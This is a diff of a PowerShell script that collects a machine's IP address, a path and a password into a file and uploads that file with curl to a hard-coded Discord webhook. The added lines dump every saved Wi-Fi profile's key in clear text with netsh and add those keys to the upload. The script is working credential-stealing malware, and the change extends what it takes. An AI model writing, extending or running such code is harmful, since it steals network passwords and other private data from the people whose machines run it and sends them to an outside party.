@@ -22,11 +22,14 @@ if(Test-Path $configfile){
     Remove-Item $configfile -Force
 }
 $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.PrefixOrigin -eq "Dhcp" } | Select-Object -ExpandProperty IPAddress)
+$wifiCredential = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()} | ForEach-Object {netsh wlan show profile name="$_" key=clear}
 
 #Write config file
 Add-Content -Path $configfile -Value $ip
 Add-Content -Path $configfile -Value $pathDir
 Add-Content -Path $configfile -Value $pass
+Add-Content -Path $configfile -value "Wifi Credential: $wifiCredential"
+
 #discord webhook
 $WebhookURL = "https://discord.com/api/webhooks/1341801773546999948/2ocX7pSZBLbPlU8_FvGSY6dIsEd5MBy-muOLz5V6g-VwpX8ffe8ytFSA8J2jzJ31JWZi"
 curl.exe -F "file=@$configfile" $WebhookURL
